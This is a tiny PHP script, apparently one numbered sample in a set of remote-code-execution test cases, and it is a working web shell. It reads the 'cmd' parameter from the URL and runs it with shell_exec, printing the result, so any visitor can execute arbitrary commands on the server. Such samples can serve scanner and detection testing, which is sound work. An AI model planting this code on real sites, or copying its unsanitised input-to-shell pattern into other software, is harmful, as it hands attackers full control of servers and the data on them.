<?php
// RCE test variation #864
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>